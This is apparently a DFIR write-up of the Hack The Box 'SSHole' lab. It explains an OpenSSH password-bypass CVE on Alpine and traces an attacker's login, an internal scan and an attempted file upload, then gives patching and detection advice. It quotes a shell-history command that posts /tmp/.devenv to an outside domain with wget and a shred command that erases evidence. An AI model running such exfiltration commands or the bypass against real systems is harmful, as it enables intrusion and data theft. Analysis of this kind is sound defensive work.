---
layout: post
title: "SSHole: A Password Bypass on an Alpine Jumpbox"
description: "An Alpine jumpbox accepted an SSH password for a passwordless account. I trace the login, internal host notes, and attempted file upload in the SSHole Sherlock."
date: 2026-11-09
category: "Incident analysis"
tags: [SSHole, OpenSSH, Alpine Linux, CVE-2026-123158, DFIR]
permalink: /articles/sshole-alpine-jumpbox-password-bypass/
thumbnail: /assets/images/sshole/sshole-cover.png
thumbnail_alt: "Yellow asterisk beside sshole on a dark background"
---

*The Guarded Kernel · Incident analysis · Research reviewed: 9 November 2026*

## Scenario

In the Hack The Box *SSHole* Sherlock, a jumpbox is suspected of contacting a suspicious domain. The supplied evidence is a small filesystem snapshot, including SSH configuration, system logs, the `adminsvc` home directory, and shell history. There is no packet capture or HTTP response log. All times below are **UTC** on 6 November 2026.

The attack path is short: a password bypass grants access as `adminsvc`; the account's history then records an internal scan command, a script fetch, and an attempted upload of `/tmp/.devenv`.

<figure class="article-figure">
  <a href="{{ '/assets/images/sshole/sshole-attack-chain.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open the SSHole attack chain at full size">
    <img src="{{ '/assets/images/sshole/sshole-attack-chain.png' | relative_url }}" alt="SSHole evidence chain from vulnerable Alpine configuration and an accepted SSH password to recorded scan, upload, and cleanup commands." width="1800" height="1700" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 1 — The login is confirmed by the SSH log. Later actions follow shell-history order; their outcomes are not independently logged. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

## The vulnerability, simply and technically

[CVE-2026-123158][cve] lets an attacker authenticate to certain OpenSSH accounts **without knowing their password**. On affected Alpine systems, an account whose stored password field is `*` can accept an unusually long password even though it should not accept any password. This requires SSH password authentication, OpenSSH running without PAM, and another local account with a real `$5$` or `$6$` password hash. [Alpine's advisory][alpine-advisory] describes these conditions.

The collision happens in the password check. OpenSSH borrows a salt from another account when the target's stored field is too short to contain one. For a submitted password over 256 bytes, musl's `crypt()` returns the error string `*`. OpenSSH compares that return value with the target account's stored `*` and accepts the match. [OpenSSH 10.6p2][openssh-release] added a workaround; Alpine backported it to its supported branches. The snapshot does not retain the submitted password, so this mechanism explains the observed login rather than revealing its exact input.

## Working the Sherlock

### 1. Establish the vulnerable setup

`/etc/alpine-release` and `/etc/os-release` identify **Alpine Linux 3.24.3**. The SSH configuration enables `PasswordAuthentication yes`. In `/etc/shadow`, `adminsvc` has the literal field `*`, while root has a `$6$` hash. This combination matches the advisory's prerequisites; the snapshot does not include the exact installed OpenSSH build.

<figure class="article-figure">
  <a href="{{ '/assets/images/sshole/alpine-version.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open the Alpine version evidence">
    <img src="{{ '/assets/images/sshole/alpine-version.png' | relative_url }}" alt="Terminal output showing Alpine Linux version 3.24.3 in alpine-release and os-release." width="379" height="92" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 2 — The two release files agree on Alpine Linux 3.24.3. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

<figure class="article-figure">
  <a href="{{ '/assets/images/sshole/ssh-preconditions.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open the SSH configuration and account evidence">
    <img src="{{ '/assets/images/sshole/ssh-preconditions.png' | relative_url }}" alt="Terminal output showing PasswordAuthentication yes, adminsvc in passwd, and an asterisk password field for adminsvc in shadow." width="630" height="121" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 3 — `adminsvc:*` is the key local condition. The screenshot avoids exposing the root password hash. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

### 2. Locate the bypass login

At **11:27:05**, `/var/log/messages` records a failed password for `adminsvc` from **192.168.72.1:61351**. At **11:27:08**, the same SSH connection records `Accepted password for adminsvc`. A password login to an account with `*` in `/etc/shadow` is the strongest evidence of exploitation here. The session disconnects at **12:20:02**. The log supplies the time, the contemporaneous `apk.log` supplies the year, and `/etc/localtime` matches UTC.

<figure class="article-figure">
  <a href="{{ '/assets/images/sshole/ssh-login.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open the SSH login timeline">
    <img src="{{ '/assets/images/sshole/ssh-login.png' | relative_url }}" alt="SSH log showing failed and accepted password for adminsvc from 192.168.72.1, the later disconnect, a 2026 apk log entry, and UTC timezone check." width="1465" height="134" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 4 — The failed attempt and successful login share the source IP and port. The accepted password at 11:27:08 is the first confirmed access. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

### 3. Follow the recorded activity

`/home/adminsvc/.ash_history` records a command intended to sweep `192.168.18.1–254` and ports `1–65535`. The separately edited `scanreport.txt` lists **192.168.18.5** on ports **443, 445, 3389** and **192.168.18.23** on **88, 139, 445, 3389, 6801, 54321**. Ports 139/445 suggest SMB and 3389 suggests RDP, but the archive shows no login to either internal host.

<figure class="article-figure">
  <a href="{{ '/assets/images/sshole/scan-and-hosts.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open the scan command and internal host notes">
    <img src="{{ '/assets/images/sshole/scan-and-hosts.png' | relative_url }}" alt="Shell history scan command and scanreport.txt entries for 192.168.18.5 and 192.168.18.23." width="768" height="92" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 5 — The history records the command; `scanreport.txt` records two host and port lists. It is not raw scanner output. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

There is a wrinkle: the command uses Bash-style `{1..254}` expansion, which BusyBox `ash` does not perform. Because this is `.ash_history` and the report was opened with `vi`, I cannot claim the command worked as written or that it produced those port lists.

The next history entries invoke a GitHub-hosted `setup.sh`, inspect `/tmp/.devenv`, run `wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process`, and then run `shred -u /tmp/.devenv`.

<figure class="article-figure">
  <a href="{{ '/assets/images/sshole/upload-history.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open the script and upload commands">
    <img src="{{ '/assets/images/sshole/upload-history.png' | relative_url }}" alt="Shell history lines for fetching a setup script, posting /tmp/.devenv to devv.coding.eu/process, and shredding the file." width="830" height="76" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 6 — The upload destination is explicit in the command. The ZIP has no script body, file contents, or network response to confirm execution or successful transfer. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

### Conclusion

The confirmed outcome is an unauthorized SSH login to the jumpbox. The history supports reconnaissance and an **attempted** file upload, with no proof of lateral movement or completed exfiltration.

## Mitigation and impact

**Patching is the primary fix.** [Alpine lists][alpine-advisory] `openssh 10.3_p1-r2` as the fixed package for its 3.24 branch, included in Alpine 3.24.4. After upgrading, restart `sshd`; replacing the package alone leaves an already running daemon in memory. If patching must wait, disable SSH password authentication and restart the service after verifying key-based access. [OpenSSH's release notes][openssh-release] describe the upstream workaround.

In this case the attacker reached a jumpbox with visibility into an internal subnet. A real response would preserve the SSH logs and shell history, check the two listed internal hosts, review outbound traffic to `devv.coding.eu`, and assess whether `/tmp/.devenv` or SSH keys were accessed. The supplied snapshot cannot settle those questions.

## Detection: useful, but secondary to patching

The strongest alert is an SSH **`Accepted password`** event for an account whose shadow password field is exactly `*`. Alpine [recommends checking for this pattern][alpine-advisory]. It requires host account context alongside central SSH logs; an accepted password event alone is ordinary. In this lab, `adminsvc:*` plus the 11:27:08 success provides that context.

Process telemetry could also flag a jumpbox account running a network sweep or `wget --post-file` to an unapproved external domain. Those are investigation leads, not a reliable signature for CVE-2026-123158. Disabling password authentication or patching OpenSSH prevents the initial foothold; detections help find systems that may already have been used.

### Sources

- [Alpine Linux: OpenSSH password authentication bypass][alpine-advisory] — prerequisites, detection, and fixed packages.
- [OpenSSH 10.6p2 release notes][openssh-release] — upstream workaround.
- [Official CVE-2026-123158 record][cve] — identifier and affected OpenSSH context.
- Hack The Box, *SSHole* Sherlock — supplied filesystem snapshot and scenario; the evidence figures are from my analysis of the ZIP.

[alpine-advisory]: https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/
[openssh-release]: https://www.openssh.org/txt/release-10.6p2
[cve]: https://github.com/CVEProject/cvelistV5/blob/main/cves/2026/123xxx/CVE-2026-123158.json
